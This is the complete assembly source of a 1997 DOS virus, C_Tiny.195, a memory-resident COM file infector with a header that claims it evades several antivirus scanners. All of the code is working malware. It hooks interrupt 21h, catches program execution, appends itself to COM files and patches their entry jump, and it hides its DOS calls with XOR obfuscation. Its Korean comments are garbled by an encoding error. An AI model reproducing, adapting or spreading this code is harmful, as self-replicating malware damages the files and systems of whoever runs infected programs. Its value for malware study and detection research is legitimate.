;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;          C_Tiny.195                         \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
;
; Virus Name : C_Tiny.195
; Author     : Osiris
; Origin     : Corea
; Date       : 1997/12/08
;
; Type : Memory resident COM
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  aœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
; ˆe”eÐe œ‘¬wº ¤a·¡œá¯a¡ ·¥ÈáœóËa ¥BÈá º­¡ÎaµA ¬wºÐe”a. (0020:0000)
; ¤a·¡œá¯a ¬wº¸å ·¡ µwµbµA •A·¡Èáˆa ¸åÑa ´ô´á´¡ Ða”a.  e´¢ ·¡µwµbµA 0 ·¡ ´a“¥
; ”aŸe ˆt·¡ ¸á¸w–A´á ·¶”a¡e ¤a·¡œá¯a“e ‹¡´â¸w­¡µA ¬wº Ða»¡ ´g“e”a.
; ‹aŸ¡‰¡, COM Ìa·© e ˆqµq¯¡Ç¡¡a ˆqµq µa¦“e Ìa·©· Àõ ¦¦…·¡ 'M' ·¥»¡ §¡Ša Ðe”a
;
; AVP,DSAV,F-PROT,SCAN,TBAV µA¬á Ñe¸ »¥”e–A»¡ ´g“e”a. ”e, F-PROT ·¥‰·»¡“wµA“e
; »¥”e·¡ –E”a. ”a·q¤á¸åµA“e »¥”e–A»¡ ´g·i ˆõ·¡”a.
;
; ·¥ÈáœóËa ¥BÈá ÉA·¡§iµA ¬wº Ða“e ¤a·¡œá¯a“e Ça‹¡ˆa ´aº ¸b´a´¡ Ðe”a.
;
; ¥¥‰b¸â·¥ œ‘¬wº ¤a·¡œá¯a ¹A¸bµA ´|¬á ¹AÐe¸â·¥ œ‘¬wº¤w¤ó·¥ ·¥ÈáœóËa¥BÈá º­¡
; ÎaµA ¬wº Ða“e ¤a·¡œá¯a·¡”a.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE
            .286

 C_Tiny:
            DB    0E8h,00,00            ;
            pop   si                    ; ¤a·¡œá¯a ¯¡¸b¸ñ ŠÐa‹¡
            sub   si,0003               ; SI = ¤a·¡œá¯a ¯¡¸b¸ñ

            push  si                    ; ¸á¸w
            xor   di,DI                 ;
            mov   ds,DI
            mov   cx, offset End_Memory ; ¤a·¡œá¯a ‹©·¡  eÇq §¡Ša

 Check_IVT_Zero:
            cmp   byte ptr [DI+200h],0  ; ·¥ÈáœóËa º­¡Îaˆa 0 ·¥»¡ §¡ŠaÐe”a.
            jnz   Restore_COM_Head      ;  e´¢ ´á˜å ˆt·¡ œa•¡ 0 ·¡ ´a“¥ ‰w¶“e
            inc   DI                    ; ‹¡´â¸w­¡µA ¬wº Ða»¡ ´g“e”a
            loop  Check_IVT_Zero        ;

 Copy_Vir_IVT:
            mov   ax,0020h              ;
            mov   es,ax                 ;
            mov   cx, offset End_Virus  ; ¤a·¡œá¯a ‹©·¡
            xor   di,di                 ; ¥¢¬a Ði ‰µ (0020:0000h)
            db    2Eh
            repz  movsb                 ; ¥¢¬a !

            mov   si, 0084h             ; Int 21h º­¡ˆt ´è‹¡
            mov   di, offset Jmp_Org_Int21 + 1
            push  si
            movsw
            movsw

            pop   si                    ;
            cli                         ; Int 21h ˆa¡À‹¡
            mov   word ptr [SI], offset NewInt21
            mov   word ptr [SI+2], 0020h
            sti

 Restore_COM_Head:
            push  cs                    ; cs=ds=es
            pop   ds
            push  cs
            pop   es
            pop   si                    ; SI ¥¢Š
            add   si, offset OldCOMHead ; COM ´|¦¦… º­¡ ‰¬e
            mov   di,101h               ; COM ´|¦¦… ¥¢Š
            dec   di                    ; DI = 100h
            push  di                    ; ·¡•·Ði º­¡ ¸á¸w
            movsw                       ; 4 ¤a·¡Ëa ¥¢Š
            movsw                       ;
            ret                         ; CS:100h ¡ ·¡•·

 OldCOMHead db    90h,90h,0CDh,20h      ; ¶¥œ COM ´|¦¦…
            db    'C_Tiny.B'            ; ¤a·¡œá¯a ·¡Ÿq

 Set_Pnt:
            mov   ah,42h                ; Í¡·¥Èá
            xor   cx,cx
            xor   dx,dx
            int   21h
            ret

 call_Int21:
            xor   ah,0F0h               ;
            int   21h                   ;
            ret

 NewInt21:
            pusha                       ; 286 + µA¬á »¡¶¥
            push  ds
            push  es

            xchg  ah,al
            cmp   al, 4Bh               ; Ìa·© ¯©Ð—·¥ˆa ?
            jnz   Error

            mov   ax, (3D02h XOR 0F000h) ; Ìa·© µi‹¡
            call  call_Int21
            jc    Error                 ; µi‹¡ µAœá ?

            xchg  ax,bx                 ; BX = Ìa·©Ð…—i

            push  cs                    ; ­A‹a åËa É··©
            pop   ds
            push  cs
            pop   es

            mov   ah, (3fh XOR 0F0h)    ; Ìa·© ·ª‹¡
            mov   cx, 4                 ; ¤a·¡Ëa®
            mov   dx, offset OldCOMHead ; ¤áÌá º­¡
            call  call_Int21

            cmp   byte ptr OldCOMHead, 'M' ; ˆqµq–A´öa / EXE Ìa·©·¥ˆa ?
            jz    Close

            mov   al,2                  ; Ìa·© {·a¡ ·¡•·
            call  Set_Pnt

            mov   word ptr Jump_Code, 0E94Dh ; ¯¢¥i¸a + ¸ñÏaˆt

            sub   ax,0004               ; ¸ñÏaˆt ‰¬e
            mov   word ptr Jump_Code + 2, ax ;

            mov   ah, (40h XOR 0F0h)    ; ¤a·¡œá¯a ³a‹¡
            mov   cx, offset End_Virus  ; ¤a·¡œá¯a ‹©·¡
            xor   dx,dx                 ; ¤áÌá µ¡Ïa­U
            call  call_Int21

            xor   al,al                 ; Ìa·© Àá·q·a¡ ·¡•·
            call  Set_Pnt

            mov   ah, (40h XOR 0F0h)    ; ´|¦¦… ³a‹¡
            mov   cx, 4                 ; ¤a·¡Ëa ®
            mov   dx, offset Jump_Code  ; µ¡Ïa­U
            call  call_Int21

 Close:
            mov   ah, (3Eh XOR 0F0h)    ; Ìa·© ”h‹¡
            call  call_Int21
 Error:
            pop   es
            pop   ds
            popa
 Jmp_Org_Int21:
            db    0EAh                  ; --> µa‹¡Œa»¡ Ìa·©µA ¸á¸w
 End_Virus:
            dw    ?,?
 Jump_Code  dw    ?
            db    ?,?

 End_Memory:                            ; ¡A¡¡Ÿ¡µA¬á ¤a·¡œá¯a {
            END   C_Tiny

